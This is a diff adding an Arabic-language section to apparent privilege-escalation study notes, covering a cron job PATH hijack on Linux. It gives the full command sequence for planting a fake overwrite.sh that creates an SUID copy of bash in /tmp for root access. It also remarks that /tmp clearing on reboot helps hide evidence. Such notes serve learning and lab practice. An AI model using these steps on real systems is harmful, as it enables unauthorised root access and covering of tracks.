@@ -314,6 +314,55 @@ Used responsibly, this is a great example of **local privilege escalation** via 
    </details>
 
 
+
+* <details>
+     <summary>PATH Environment Variable</summary>
+
+
+   # Cron Jobs - PATH Environment Variable
+
+   (overwrite.sh لو مينفعش تكتب جواه)
+
+   ### 6) Cron Jobs - PATH Environment variable
+
+   * هنا بنستغل اعدادات الـ PATH الخاصة بالـ Cron Jobs للوصول على صلاحيات الـ `root`
+
+   * `cat /etc/crontab`
+       * `PATH=/home/user:/usr/local/sbin:/...`
+    * هنا في مشكله هو بيبحث عن الملفات المجدوله زى overwrite.sh
+    * لكن بيبدأ البحث في `/home/user` والملف الاصى موجود فى `/usr/local/bin`
+    * ده معناه إن لو عملنا ملف بنفس الاسم
+    * في `/home/user` وكتبنا فيه كود خبيث يخلينا نحصل صلاحيات `root`
+
+   * `nano /home/user/overwrite.sh`
+       * `#!/bin/bash`
+       * `cp /bin/bash /tmp/rootbash`
+       * `chmod +s /tmp/rootbash`
+    * الكود ده بينقل ال ``bash`` ل ``/tmp/rootbash`` وده ملف احنا عملناهو بعد كده يديلو صلاحيات ``SUID``
+    * اى ان المستخدم يمكنه تشغيل ``BASH`` بصلاحيات ``root``
+    
+
+   * `chmod +x /home/user/overwrite.sh`
+    * نخلي الملف قابل للتنفيذ
+    * الآن عند تشغيل الـ cron الملف هيتنفذ ما يؤدي الى
+    * إنشاء `rootbash` في `/tmp/`
+
+   * `/tmp/rootbash -p`
+    * الأمر ده هيخلي `bash` يحتفظ بصلاحيات ال `root`
+    * من بعد تشغيله من قبل مستخدم عادي
+
+   * `whoami`
+       * `root`
+
+
+   > ### ليه استخدمنا ``/tmp`` لتخزين الملف
+   >
+   - > عشان ده مجلد عام يمكن لاى مستخدم يكتب فيه لذا يمكنك انشاء ملفات بدون صلاحيات
+   - > معظم الانظمه تمسح الملفات داخل ``/tmp`` تلقائيا عند اعاده التشغيل مما يساعد فى اخفاء الادله بعد الهجوم
+
+     
+</details>
+
   
 </details>
 
